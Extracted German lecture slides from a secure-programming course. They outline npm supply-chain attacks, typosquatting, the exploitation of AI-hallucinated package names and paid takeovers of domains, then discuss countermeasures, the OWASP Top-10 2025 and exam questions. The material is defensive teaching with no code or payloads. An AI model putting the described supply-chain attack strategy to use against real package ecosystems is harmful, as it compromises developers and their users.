+2) Angreifer behebt kleinere Bugs bei anderen Open Source-Projekten
+und baut bei der Gelegenheit die eigene Package mit ein
+−
+
+▪
+
+“Hey, I’ve fixed issue x and also added colorful logging!”
+
+Nach einiger Zeit werden viele andere Open Source-Projekte die
+Angreifer-Package als require(‘Package‘) Dependency enthalten
+−
+
+Rechner, die ein entsprechendes Open Source-Projekt nutzen,
+installieren auch automatisch die Package des Angreifers mit
+
+Prof. Buchmann - (In)Secure Programming
+
+63
+
+Angriff auf das NPM-Paketmanagement (3/3)
+
+▪
+
+Angreifer unterscheidet nun
+1) Saubere Version des Source Codes auf Github
+2) Manipulierte Version als Precompiled Package im NPM-Manager
+▪
+▪
+
+Niemand wird den Unterschied bemerken, solange nicht jemand
+die vorkompilierte Package disassembliert
+Wie wahrscheinlich ist das bei 2.1 Mio. Packages?
+Prof. Buchmann - (In)Secure Programming
+
+64
+
+Funktioniert
+der Angriff
+wirklich?
+
+https://www.trendmicro.com/vinfo/es/security/news/cybercrime-and-digital-threats/hacker-infects-node-js-pa
+ckage-to-steal-from-bitcoin-wallets
+Prof. Buchmann - (In)Secure Programming
+
+65
+
+Alternative Angriffsmethoden (1/4)
+
+▪
+
+Typosquatting
+
+Entwickler hat
+sich vertippt
+− Bibliothek mit
+Tippfehler im
+Namen existiert,
+und enthält
+Schadcode
+− z.B. Orginal-Lib
+"NumPy", Libs mit
+Schadcode
+heißen NumPi,
+NunPi, NunPy, …
+(Artikel vom 14.02.23)
+−
+
+https://www.heise.de/news/Paketmanager-PyPI-451-Pakete-versuchenKryptowaehrung-zu-stehlen-7494743.html
+Prof. Buchmann - (In)Secure Programming
+
+66
+
+Alternative Angriffsmethoden (2/4)
+
+▪
+
+Mit KI ist aber
+moderner ;-)
+
+(Artikel vom 28.03.24)
+
+https://www.theregister.com/2024/03/28/ai_bots_hallucinate_software_packages/
+Prof. Buchmann - (In)Secure Programming
+
+67
+
+Alternative Angriffsmethoden (3/4)
+
+▪
+
+Leute überreden
+klappt auch
+
+(Artikel vom 29.05.24)
+
+https://www.bleepingcomputer.com/news/security/cybercriminals-pose-as-helpful-stack-overflow-users-to-pu
+sh-malware/
+Prof. Buchmann - (In)Secure Programming
+
+68
+
+Alternative Angriffsmethoden (4/4)
+
+▪
+
+Oder wenn Sie
+Geld haben, die
+Domain incl.
+Github-Account
+einfach kaufen
+
+(Artikel vom 25.06.24)
+
+https://sansec.io/research/polyfill-supply-chain-attack
+Prof. Buchmann - (In)Secure Programming
+
+69
+
+Lassen sich Angriffe mittels Node.js vermeiden?
+▪
+
+Auf jeder Webseite, die Kundendaten abfragt oder anzeigt:
+−
+
+Niemals vorkompilierten Code von Dritten verwenden!
+▪
+▪
+▪
+▪
+▪
+
+▪
+
+npm modules
+Google Tag Manager
+ad networks
+web analytics
+…
+
+Wenn tatsächlich komplexe Software-Ökosysteme nötig sind, sollten
+sie auf unkritische Aufgaben beschränkt sein
+−
+
+Login-Seiten, Web-Formulare etc. lassen sich auch mit einem
+verschlüsselten iframe auf eine Webseite einbauen
+
+Prof. Buchmann - (In)Secure Programming
+
+70
+
+Gegenmaßnahmen
+
+Gegenmaßnahmen, die nicht funktionieren (1/3)
+▪
+
+Penetrate-and-Patch
+−
+−
+−
+
+▪
+
+Schreibe ein Programm
+Suche hinterher nach Programmierfehlern bzw. warte auf
+Nutzerbeschwerden
+Behebe jeden gefundenen Fehler
+
+Funktioniert nicht, weil:
+−
+
+Programmierer konzentriert sich auf die technischen Aspekte
+▪
+
+−
+−
+−
+
+ignoriert Systemumgebung, Anwendungskontext, Architektur, ...
+
+Nicht erkannte/nicht gemeldete Fehler bleiben im Programm
+Behebung eines Fehlers kann den nächsten Fehler hervorrufen
+Manche Fehler lassen sich nicht beheben, ohne den halben
+Programmcode neu zu schreiben
+
+Anm.: Sie sollten gefundene Fehler trotzdem beheben!
+(Nur verlassen Sie sich nicht darauf, dass die Anwender alles finden)
+Prof. Buchmann - (In)Secure Programming
+
+72
+
+Gegenmaßnahmen, die nicht funktionieren (2/3)
+▪
+
+Security by Obscurity
+−
+−
+
+▪
+
+Annahme, dass ein System sicher ist, solange kein Außenstehender die
+internen Abläufe und den Code kennt
+Halte den Code geheim und hoffe, dass niemand die Backdoor findet
+
+Funktioniert nicht, weil:
+−
+
+Erfahrene Angreifer können viel erraten
+▪
+
+−
+
+Ein entschlossener Angreifer findet Möglichkeiten
+▪
+
+−
+
+z.B. aus der Art und Weise, wie das Programm mit fehlerhaften
+Eingabedaten umgeht
+Social engineering, Disassemblierung des Codes, Memory Dumps, etc.
+
+Hilft nicht gegen einen internen Angreifer
+▪
+
+unzufriedener oder gekündigter Programmierer
+
+Prof. Buchmann - (In)Secure Programming
+
+73
+
+Gegenmaßnahmen, die nicht funktionieren (3/3)
+▪
+
+Code Analyzer, Werkzeuge zum Schutz vor Buffer Overflows
+−
+−
+−
+−
+
+▪
+
+Schreibe ein Programm
+Lasse ein Tool die Fehler im Programm suchen und
+am besten noch automatisch beheben
+Alternativ: verlasse dich auf die Mechanismen des
+Compilers/Betriebssystems
+Wenn der Code Analyzer nichts mehr findet, ist das Programm ok
+
+Funktioniert nicht, weil:
+−
+−
+
+Unmöglich, Abwesenheit von Programmierfehlern zu beweisen
+Tools finden nur Fehler, für deren Erkennung sie programmiert sind
+
+Anm.: Sie sollten Code Analyzer trotzdem verwenden!
+(Nur verlassen Sie sich nicht darauf, und führen Sie Code Review weiter)
+Prof. Buchmann - (In)Secure Programming
+
+74
+
+Gegenmaßnahmen, die funktionieren
+▪
+
+Validiere jeglichen Input
+−
+−
+
+▪
+
+Prüfe alles, was von außerhalb ins Programm kommt
+Beinhaltet nicht nur Nutzereingaben oder Internet-Daten, sondern auch
+Daten von der eigenen Festplatte oder aus dem internen Netzwerk
+
+Sichere das Programm gegen die Nutzer
+−
+
+Keine sensitiven Daten sollten
+▪
+▪
+
+−
+
+▪
+
+sichtbar und unverschlüsselt irgendwo gespeichert werden
+offen für Manipulationen sein
+
+Wenn Daten geändert werden können, nimm an dass sie geändert
+wurden
+
+Sichere Übernahme von Daten
+−
+
+Zugriffskontrolle muss korrekt, unvermeidbar und bei jedem Zugriff
+auf sensible Daten mit einbezogen sein
+→ keine Backdoors!
+
+Prof. Buchmann - (In)Secure Programming
+
+75
+
+Open Web Application Security Project
+▪
+
+2001 gegründete Non-Profit Organisation (USA)
+−
+−
+−
+
+Praktische Unterstützung bei der Entwicklung sicherer Software
+Open Source, offene Community
+Zahlreiche Projekte auf allen Ebenen des Softwareengineering
+▪
+
+▪
+
+Requirements, Design, Implementation, Verification, Policies, Education,
+Operations
+
+OWASP Top-10
+−
+−
+−
+
+Standard "Awareness"-Dokument für Entwickler und Web App Security
+Community-Konsens über die kritischsten Sicherheitslücken
+Alle 3-4 Jahre überarbeitet, aktuell sind die OWASP Top-10 2025
+https://owasp.org/Top10/2025/
+
+Prof. Buchmann - (In)Secure Programming
+
+76
+
+OWASP Top-10 (1/2)
+Kapitel 3
+
+▪
+
+A01:2025 – Broken Access Control
+
+−
+Kapitel 5,7
+
+▪
+
+A02:2025 – Security Misconfiguration
+−
+
+Kapitel 8
+
+▪
+
+Kapitel 2
+
+(Automatischer) Import von Bibliotheken aus unsicherer Quelle,
+Verschleppen von Bug-Fixes, Versionsstände passen nicht zueinander
+
+A04:2025 – Cryptographic Failures
+
+Kapitel 4
+
+▪
+
+Ungeänderte, aktive Default-Passwörter, aktivierte unnötige Dienste,
+deaktivierte Updates, Firewalls in Standardkonfiguration, etc.
+
+A03:2025 – Software Supply Chain Failures
+−
+
+▪
+
+Verstoß gegen Least Privilege oder Deny-by-Default, Übergehen der
+Zugriffskontrolle möglich, z.B. durch Zugriff durch manipulierte URLs
+
+−
+
+Schwache/keine Verschlüsselung, schwachen Kryptografie als Default
+oder Fallback, Implementierungsfehler, falsches Schlüssel-Management
+
+A05:2025 – Injection
+−
+
+Daten aus unsicherem Kontext werden nicht validiert oder gefiltert,
+SQL, NoSQL, OS command, LDAP , u.v.m. injection
+Prof. Buchmann - (In)Secure Programming
+
+77
+
+OWASP Top-10 (2/2)
+Kapitel 6,7
+
+▪
+
+A06:2025 – Insecure Design
+
+−
+Kapitel 3
+
+▪
+
+A07:2025 – Authentication Failures
+−
+
+Kapitel 6
+
+▪
+
+Betrifft Trust Boundaries, z.B. nicht vertrauenswürdige Datenquellen,
+Updates aus kompromittierten Repositories, manipulierte Root-of-Trust
+
+A09:2025 – Security Logging and Monitoring Failures
+
+−
+Kapitel 8
+
+▪
+
+(Multifaktor-)Authentifizierung mit fälschbaren Merkmalen, Ausspähbare
+oder fälschbare Session IDs, Unsicherer Umgang mit Logout, Timeout
+
+A08:2025 – Software or Data Integrity Failures
+
+−
+Kapitel 7
+
+▪
+
+Design-Fehler auf der Ebene der Business Logic, z.B. Abläufe wenn
+wenn ein Passwort zurückgesetzt oder ein Zertifikat erneuert wird
+
+Fehlende oder manipulierbare Logs von sicherheitskritischen Assets,
+Unzureichende Prozesse für die Auswertung der Logs
+
+A10:2025 – Mishandling of Exceptional Conditions
+−
+
+Fehlende oder unzureichende Fehlerbehandlung im Programmcode
+
+Prof. Buchmann - (In)Secure Programming
+
+78
+
+Sind Sie sicher, wenn Sie alle 10 Risiken abdecken?
+▪
+
+Kurze Antwort: Nein!
+
+▪
+
+Lange Antwort:
+−
+−
+−
+
+OWASP dokumentiert die am häufigsten ausgenutzten Schwachstellen
+Liefert de-facto-Standard für Tools für die statische Code-Analyse
+Bei nicht zielgerichteten
+Bedrohungen nützlich
+▪
+
+−
+
+z.B. wenn Angreifer
+automatisiert nach häufigen
+Schwachstellen scannt
+
+Bei gezielten Angriffen
+nicht ausreichend
+▪
+
+z.B. wenn ein erfahrener
+Angreifer ein bestimmtes
+System auf vorhandene
+Schwachstellen untersucht
+
+Prof. Buchmann - (In)Secure Programming
+
+83
+
+Abschluss
+
+Zusammenfassung
+▪
+
+Software-Engineering ist ein wichtiger Baustein der IT-Sicherheit
+−
+
+▪
+
+Das Schreiben von Code ist nur ein Bruchteil der Entwicklungszeit
+−
+−
+
+▪
+
+Software-Schwachstellen sind Programmierfehler, die bei der normalen
+Ausführung nicht auftreten
+
+Anforderungsanalyse, Dokumentation, Testen, … ist der aufwendige Teil
+Vermeidung dieses Aufwands generiert technische Schulden
+
+Software Engineering ist heute gut verstanden
+−
+
+Also halten Sie sich an die Prinzipien guten Software Engineerings ;-)
+
+Prof. Buchmann - (In)Secure Programming
+
+85
+
+Mögliche Prüfungsfragen
+▪
+
+Erklären Sie, auf welche Weise ein Buffer Overflow im Code eines
+Webservers Schaden anrichten kann.
+
+▪
+
+Warum sind Penetrationstests ein schlechter Ersatz für eine
+angemessene Softwareentwicklung?
+
+▪
+
+Erklären Sie, warum es unmöglich ist, ein Programm auf die
+vollständige Abwesenheit von Programmierfehlern zu überprüfen.
+
+▪
+
+Erläutern Sie anhand eigener Beispiele, warum die Kapselung in OOEntwicklungskonzepten zur IT-Sicherheit beiträgt.
+
+▪
+
+Warum sind Sie nicht ausreichend gesichert, wenn Sie nur die
+OWASP Top-10 Schwachstellen ausschließen, sollten dies aber
+troztzdem tun?
+Prof. Buchmann - (In)Secure Programming
+
+86
+
+
